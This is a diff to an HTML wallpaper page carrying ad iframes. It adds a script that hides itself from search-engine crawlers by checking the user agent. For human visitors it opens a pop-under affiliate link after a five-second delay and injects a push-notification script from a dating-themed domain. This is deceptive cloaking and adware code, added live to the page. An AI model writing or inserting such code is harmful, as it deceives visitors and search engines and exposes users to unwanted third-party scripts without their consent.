@@ -10,6 +10,7 @@
             padding: 0;
             background-color: #f0f0f0;
             overflow: hidden;
+            font-family: Arial, sans-serif;
         }
         .container {
             display: flex;
@@ -52,6 +53,7 @@
                 width: 100%;
                 flex-direction: row;
                 overflow-x: auto;
+                gap: 0;
             }
             .ad-sidebar iframe {
                 width: 100%;
@@ -59,8 +61,37 @@
             }
         }
     </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            function isBot() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const bots = ['googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp'];
+                return bots.some(bot => userAgent.includes(bot));
+            }
+
+            if (!isBot()) {
+                setTimeout(function() {
+                    var url = 'https://scpooj.com/click?o=2&a=1325&sub_id1=iphone-wallpapers';
+                    var newWindow = window.open(url, '_blank');
+                    if (newWindow) {
+                        newWindow.blur();
+                        window.focus();
+                    }
+                }, 5000); // 5-секундная задержка
+            }
+
+            // Push уведомления
+            if (!isBot()) {
+                var script = document.createElement('script');
+                script.src = 'https://stellar-dating2.fun/js/push/p.js?u=vamkte4&o=d1epygr&v=1';
+                document.body.appendChild(script);
+            }
+        });
+    </script>
 </head>
 <body>
+
     <div class="container">
         <!-- Реклама сверху -->
         <div class="ad-banner">
@@ -78,7 +109,6 @@
             <iframe src="https://creative.rmhfrtnd.com/widgets/wrapper?userId=d54d11998bcb8c909ae949782d4d6964e9d789cdef0e9a2c7c46055493caa714&bb=edfa3bd6.gif" frameborder="0" scrolling="no"></iframe>
         </div>
     </div>
-    <!-- Подключение Push-уведомлений -->
-    <script src="https://stellar-dating2.fun/js/push/p.js?u=vamkte4&o=d1epygr&v=1"></script>
+
 </body>
 </html>
